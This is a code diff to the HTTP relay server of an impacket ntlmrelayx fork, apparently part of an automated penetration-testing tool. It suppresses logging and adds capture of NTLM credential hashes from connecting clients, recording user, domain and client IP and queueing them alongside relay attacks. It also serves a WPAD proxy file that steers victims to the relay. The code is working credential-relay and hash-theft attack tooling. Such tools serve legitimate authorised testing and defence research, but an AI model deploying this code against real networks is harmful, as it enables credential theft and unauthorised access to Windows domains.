@@ -22,12 +22,33 @@ import struct
 import string
 from threading import Thread
 from six import PY2, b
+import logging
+import os
 
 from horizon3_impacket.impacket import ntlm, LOG
-from horizon3_impacket.impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
+from horizon3_impacket.impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile, putOutputInQueue, decode_domain, decode_username
 from horizon3_impacket.impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from horizon3_impacket.impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from horizon3_impacket.impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
+
+try:
+    from urllib.parse import urlparse
+except ImportError:
+    from urlparse import urlparse
+
+# use own logger and silence stdout
+LOG.handlers = []
+
+## now create a filehandler
+#if os.path.exists('/opt/h3/'):
+#    logfile = '/opt/h3/horizon3_impacket.log'
+#else:
+#    logfile = 'horizon3_impacket.log'
+#LOG.setLevel(logging.INFO)
+#logFormatter = logging.Formatter("%(asctime)s - %(levelname)s - %(name)s - %(funcName)s() - %(message)s")
+#fileHandler = logging.FileHandler(logfile)
+#fileHandler.setFormatter(logFormatter)
+#LOG.addHandler(fileHandler)
 
 class HTTPRelayServer(Thread):
 
@@ -39,6 +60,7 @@ class HTTPRelayServer(Thread):
                 self.address_family = socket.AF_INET6
             # Tracks the number of times authentication was prompted for WPAD per client
             self.wpad_counters = {}
+            self.ntlmrelayx_q = self.config.getToolQueue()
             socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
     class HTTPHandler(http.server.SimpleHTTPRequestHandler):
@@ -52,6 +74,8 @@ class HTTPRelayServer(Thread):
             self.machineHashes = None
             self.domainIp = None
             self.authUser = None
+            self.source_host = client_address[0]
+            self.targetprocessor = self.server.config.target
             self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||' \
                         '(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; ' \
                         'return "PROXY %s:80; DIRECT";} '
@@ -61,14 +85,16 @@ class HTTPRelayServer(Thread):
                     self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
                 self.target = self.server.config.target.getTarget()
                 if self.target is None:
-                    LOG.info("HTTPD: Received connection from %s, but there are no more targets left!" % client_address[0])
+                    #LOG.info("HTTPD: Received connection from %s, but there are no more targets left!" % client_address[0])
                     return
-                LOG.info("HTTPD: Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
+                #LOG.info("HTTPD: Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
             try:
                 http.server.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
             except Exception as e:
-                LOG.debug("Exception:", exc_info=True)
-                LOG.error(str(e))
+                # delete to get logging back
+                pass
+                #LOG.debug("Exception:", exc_info=True)
+                #LOG.error(str(e))
 
         def handle_one_request(self):
             try:
@@ -76,8 +102,10 @@ class HTTPRelayServer(Thread):
             except KeyboardInterrupt:
                 raise
             except Exception as e:
-                LOG.debug("Exception:", exc_info=True)
-                LOG.error('Exception in HTTP request handler: %s' % e)
+                # delete to get logging back
+                pass
+                #LOG.debug("Exception:", exc_info=True)
+                #LOG.error('Exception in HTTP request handler: %s' % e)
 
         def log_message(self, format, *args):
             return
@@ -158,22 +186,71 @@ class HTTPRelayServer(Thread):
 
             if messageType == 1:
                 if not self.do_ntlm_negotiate(token, proxy=proxy):
-                    LOG.info("do negotiate failed, sending redirect")
+                    #LOG.info("do negotiate failed, sending redirect")
                     self.do_REDIRECT()
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
                 if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
-                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
-                        authenticateMessage['user_name'].decode('utf-16le')))
+                    if authenticateMessage['user_name'].decode('utf-16le') == '':
+                        #LOG.info(f'{authenticateMessage["user_name"].decode("utf-16le")} was guest account - not relaying')
+                        return
+                    authUser = authenticateMessage['domain_name'].decode('utf-16le') + '\\' + authenticateMessage['user_name'].decode('utf-16le')
+                    attempted_user = authUser + '@' + self.target.netloc
+                    if attempted_user.upper() in [x.netloc for x in self.targetprocessor.finishedAttacks]:
+                        #LOG.debug(f'HTTPD: Already tried this user/target combo - skipping')
+                        return
+                    self.targetprocessor.logTarget(self.target, True, authUser.upper())
+                    #LOG.info("HTTPD: Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                    #    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
+                    #    authenticateMessage['user_name'].decode('utf-16le')))
                 else:
-                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
-                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
-                        authenticateMessage['user_name'].decode('ascii')))
+                    if authenticateMessage['user_name'].decode('ascii') == '':
+                        #LOG.info(f'{authenticateMessage["user_name"].decode("ascii")} was guest account - not relaying')
+                        return
+                    authUser = authenticateMessage['domain_name'].decode('ascii') + '\\' + authenticateMessage['user_name'].decode('ascii')
+                    attempted_user = authUser + '@' + self.target.netloc
+                    if attempted_user.upper() in [x.netloc for x in self.targetprocessor.finishedAttacks]:
+                        #LOG.debug(f'HTTPD: Already tried this user/target combo - skipping')
+                        return
+                    self.targetprocessor.logTarget(self.target, True, authUser.upper())
+                    #LOG.info("HTTPD: Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                    #    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
+                    #    authenticateMessage['user_name'].decode('ascii')))
                 self.do_ntlm_auth(token, authenticateMessage)
-                self.do_attack()
 
+                ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
+                                                    authenticateMessage['user_name'],
+                                                    authenticateMessage['domain_name'],
+                                                    authenticateMessage['lanman'], authenticateMessage['ntlm'])
+
+                # create a correlation id to match captured hash to a successful relay
+                corr_id = random.randint(1, 0xffffffff)
+                connData = {}
+                connData['CORR_ID'] = corr_id
+                self.client.sessionData['CORR_ID'] = corr_id
+
+                try:
+                    username = decode_username(authenticateMessage['user_name'])
+                except:
+                    username = authenticateMessage['user_name']
+                try:
+                    domain = decode_domain(authenticateMessage['domain_name'])
+                except:
+                    domain = authenticateMessage['domain_name']
+
+                if domain:
+                    connData['DOMAIN'] = domain
+
+                connData['USER_NAME'] = username
+                connData['ClientIP'] = self.source_host
+                self.client.sessionData['DOMAIN'] = domain
+
+                if self.server.ntlmrelayx_q != None:
+                    putOutputInQueue(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], connData,
+                                     self.server.ntlmrelayx_q)
+
+                self.do_attack()
 
                 self.send_response(207, "Multi-Status")
                 self.send_header('Content-Type', 'application/xml')
@@ -233,14 +310,14 @@ class HTTPRelayServer(Thread):
                 self.do_SMBREDIRECT()
                 return
 
-            LOG.info('HTTPD: Client requested path: %s' % self.path.lower())
+            #LOG.info('HTTPD: Client requested path: %s' % self.path.lower())
 
             # Serve WPAD if:
             # - The client requests it
             # - A WPAD host was provided in the command line options
             # - The client has not exceeded the wpad_auth_num threshold yet
             if self.path.lower() == '/wpad.dat' and self.server.config.serve_wpad and self.should_serve_wpad(self.client_address[0]):
-                LOG.info('HTTPD: Serving PAC file to client %s' % self.client_address[0])
+                #LOG.info('HTTPD: Serving PAC file to client %s' % self.client_address[0])
                 self.serve_wpad()
                 return
 
@@ -269,16 +346,17 @@ class HTTPRelayServer(Thread):
                     _, blob = typeX.split('NTLM')
                     token = base64.b64decode(blob.strip())
                 except Exception:
-                    LOG.debug("Exception:", exc_info=True)
-                    self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
+                    pass
+                    #LOG.debug("Exception:", exc_info=True)
+                    #self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
                 else:
                     messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
 
             if messageType == 1:
                 if not self.do_ntlm_negotiate(token, proxy=proxy):
                     #Connection failed
-                    LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
-                              self.target.scheme, self.target.netloc)
+                    #LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
+                    #          self.target.scheme, self.target.netloc)
                     self.server.config.target.logTarget(self.target)
                     self.do_REDIRECT()
             elif messageType == 3:
@@ -287,15 +365,17 @@ class HTTPRelayServer(Thread):
 
                 if not self.do_ntlm_auth(token,authenticateMessage):
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                        LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
-                            self.target.scheme, self.target.netloc,
-                            authenticateMessage['domain_name'].decode('utf-16le'),
-                            authenticateMessage['user_name'].decode('utf-16le')))
+                        pass
+                        #LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
+                        #    self.target.scheme, self.target.netloc,
+                        #    authenticateMessage['domain_name'].decode('utf-16le'),
+                        #    authenticateMessage['user_name'].decode('utf-16le')))
                     else:
-                        LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
-                            self.target.scheme, self.target.netloc,
-                            authenticateMessage['domain_name'].decode('ascii'),
-                            authenticateMessage['user_name'].decode('ascii')))
+                        pass
+                        #LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
+                        #    self.target.scheme, self.target.netloc,
+                        #    authenticateMessage['domain_name'].decode('ascii'),
+                        #    authenticateMessage['user_name'].decode('ascii')))
 
                     # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
                     # which we don't want
@@ -309,13 +389,35 @@ class HTTPRelayServer(Thread):
                 else:
                     # Relay worked, do whatever we want here...
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
-                            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
-                            authenticateMessage['user_name'].decode('utf-16le')))
+                        if authenticateMessage['user_name'].decode('utf-16le') == '':
+                            #LOG.info(
+                            #    f'{authenticateMessage["user_name"].decode("utf-16le")} was guest account - not relaying')
+                            return
+                        authUser = authenticateMessage['domain_name'].decode('utf-16le') + '\\' + \
+                                        authenticateMessage['user_name'].decode('utf-16le')
+                        attempted_user = authUser + '@' + self.target.netloc
+                        if attempted_user.upper() in [x.netloc for x in self.targetprocessor.finishedAttacks]:
+                            #LOG.debug(f'HTTPD: Already tried this user/target combo - skipping')
+                            return
+                        self.targetprocessor.logTarget(self.target, True, authUser.upper())
+                        #LOG.info("HTTPD: Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                        #    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
+                        #    authenticateMessage['user_name'].decode('utf-16le')))
                     else:
-                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
-                            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
-                            authenticateMessage['user_name'].decode('ascii')))
+                        if authenticateMessage['user_name'].decode('ascii') == '':
+                            #LOG.info(
+                            #    f'{authenticateMessage["user_name"].decode("ascii")} was guest account - not relaying')
+                            return
+                        authUser = authenticateMessage['domain_name'].decode('ascii') + '\\' + \
+                                        authenticateMessage['user_name'].decode('ascii')
+                        attempted_user = authUser + '@' + self.target.netloc
+                        if attempted_user.upper() in [x.netloc for x in self.targetprocessor.finishedAttacks]:
+                            #LOG.debug(f'HTTPD: Already tried this user/target combo - skipping')
+                            return
+                        self.targetprocessor.logTarget(self.target, True, authUser.upper())
+                        #LOG.info("HTTPD: Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                        #    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
+                        #    authenticateMessage['user_name'].decode('ascii')))
 
                     ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                         authenticateMessage['user_name'],
@@ -323,10 +425,36 @@ class HTTPRelayServer(Thread):
                                                         authenticateMessage['lanman'], authenticateMessage['ntlm'])
                     self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
 
+                    # create a correlation id to match captured hash to a successful relay
+                    corr_id = random.randint(1, 0xffffffff)
+                    connData = {}
+                    connData['CORR_ID'] = corr_id
+                    self.client.sessionData['CORR_ID'] = corr_id
+
+                    try:
+                        username = decode_username(authenticateMessage['user_name'])
+                    except:
+                        username = authenticateMessage['user_name']
+                    try:
+                        domain = decode_domain(authenticateMessage['domain_name'])
+                    except:
+                        domain = authenticateMessage['domain_name']
+
+                    if domain:
+                        connData['DOMAIN'] = domain
+
+                    connData['USER_NAME'] = username
+                    connData['ClientIP'] = self.source_host
+                    self.client.sessionData['DOMAIN'] = domain
+
+                    if self.server.ntlmrelayx_q != None:
+                        putOutputInQueue(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], connData,
+                                         self.server.ntlmrelayx_q)
+
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
 
-                    self.server.config.target.logTarget(self.target, True, self.authUser)
+                    #self.server.config.target.logTarget(self.target, True, self.authUser)
 
                     self.do_attack()
 
@@ -364,7 +492,7 @@ class HTTPRelayServer(Thread):
                 if self.challengeMessage is False:
                     return False
             else:
-                LOG.error('Protocol Client for %s not found!' % self.target.scheme.upper())
+                #LOG.error('Protocol Client for %s not found!' % self.target.scheme.upper())
                 return False
 
             #Calculate auth
@@ -403,11 +531,20 @@ class HTTPRelayServer(Thread):
             # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
             if self.target.scheme.upper() in self.server.config.attacks:
                 # We have an attack.. go for it
-                clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,
-                                                                               self.authUser)
+                domain = self.client.sessionData.get('DOMAIN')
+                # NOTE this will fail if the scheme of the target is anything else besides smb.  self.target.scheme is the value of the scheme from the targets file
+                clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config,
+                                                                                      self.client.session,
+                                                                                      self.authUser,
+                                                                                      source_host=self.source_host,
+                                                                                      corr_id=self.client.sessionData['CORR_ID'],
+                                                                                      domain=domain
+                                                                                      )
                 clientThread.start()
             else:
-                LOG.error('No attack configured for %s' % self.target.scheme.upper())
+                # delete to get logging back
+                pass
+                #LOG.error('No attack configured for %s' % self.target.scheme.upper())
 
     def __init__(self, config):
         Thread.__init__(self)
@@ -430,5 +567,5 @@ class HTTPRelayServer(Thread):
              self.server.serve_forever()
         except KeyboardInterrupt:
              pass
-        LOG.info('Shutting down HTTP Server')
+        #LOG.info('Shutting down HTTP Server')
         self.server.server_close()
